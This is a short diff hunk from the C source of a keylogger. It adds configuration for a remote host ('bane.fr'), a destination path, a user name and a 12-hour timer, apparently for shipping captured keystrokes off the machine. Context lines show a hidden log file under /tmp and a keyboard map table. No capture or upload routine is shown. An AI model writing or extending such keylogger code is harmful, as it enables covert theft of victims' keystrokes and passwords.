@@ -7,6 +7,12 @@
 #define KEYMAP 1 //0 en, 1 fr
 #define FILE_KEY "/tmp/.keyloger"
 
+#define HOST "bane.fr"
+#define PATH_DST "/home/batman"
+#define USER "joker"
+
+#define TIMER_KEYLOGGER 43200 //12H
+
 static const char* keymap_en[] = 
     { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
     "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
